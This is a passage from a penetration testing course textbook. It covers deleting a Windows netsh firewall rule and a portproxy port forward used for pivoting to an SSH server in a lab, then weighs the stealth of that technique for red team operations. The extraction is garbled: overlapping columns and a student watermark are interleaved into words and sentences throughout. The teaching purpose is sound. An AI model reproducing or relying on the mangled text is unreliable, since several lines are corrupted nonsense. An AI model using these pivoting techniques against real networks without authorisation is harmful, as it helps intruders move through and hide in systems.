+Using netsh advfirewall firewall, we can delete the rule, referencing it by its catchy name:
+
+"port_forward_ssh_2222".                                          fiWrhietwlaolwl         delete        rule
+
+C:\Users\Administrator><cu>netsh advfirewall
+name="port_forward_ssh_2222"</cu>
+
+<cr>Deleted  1   rule(s).</cr>                          DeletJinegftfhreefyirewall
+Ok.                                    Listing
+
+                                                629  -                              rule  with  Netsh.
+                        psourctOcSef-os5rs7wf7ua5l2rlyd1,9a0wned
+The command completes                                             we receive confirmation               that  the firewall  rule was
+deleted.                                                          created. This time we'll              use   the netsh     interface
+
+We can also delete the
+
+subcontext to del the portproxy we created. We will reference the forwarding type (v4tov4) and
+
+the listenaddress and listenport we used when creating the rule, so Netsh can determine which
+
+rule to delete.
+
+C:\Windows\Administrator> <cu>netsh interface portproxy del v4tov4 listenport=2222
+listenaddress=192.168.50.64</cu>
+
+C:\Windows\Administrator>
+                                          Listing 630 - Deleting the port forwarding rule with Netsh.
+
+When we delete the rule, we don't get any response for a success. Nevertheless, the command
+completed successfully, and the rule is deleted.
+
+      Info
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                    657
+                                                                          Penetration Testing with Kali Linux
+
+Most Windows Firewall commands have PowerShell equivalents with commandlets like
+New-NetFirewallRule and Disable-NetFirewallRule. However, the netsh interface portproxy
+command doesn't. For simplicity, we've stuck with pure Netsh commands in this
+section. However, for a lot of Windows Firewall enumeration and configuration,
+PowerShell is extremely useful. You may wish to experiment with it while completing the
+exercises for this section.
+
+In this section, we created a port forward on Windows using the Netsh command. We also
+created a firewall rule to allow inbound traffic on our listening port. We used these in conjunction
+to create a working port forward from the WAN interface of MULTISERVER03 to the SSH server
+of PGDATABASE01.
+
+Netsh's portproxy feature provides native Windows port forwarding without external
+dependencies. It's powerful, but requires administrative privileges and leaves behind
+configuration and firewall artifacts. This makes it useful in constrained environments but less
+ideal for stealthy operations, as it leaves traces unless cleaned up.
+
+      Tip
+     Before we wrap, reflect on which port forwarding tool fits your current constraints: GUI
+     or shell access, Windows or *NIX, native or portable. Effective red team operations hinge
+     on adapting tools to the environment.
+
+19.5 Wrapping up
+
+In this Module, we covered the concepts of port forwarding and SSH tunneling. This Module
+
+contains  ttootorlasvetorsaepnpelytwtohreksebotuenchdnairqieuseasnodnbbyoptahssWWshionimdtloeowwcsomanmd o*nNnIXetowpoerrkarteinsgtriscytsiotenms. s,  which
+allow us
+
+                               Jeffrey
+
+                  OS-57752190
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                               658
+
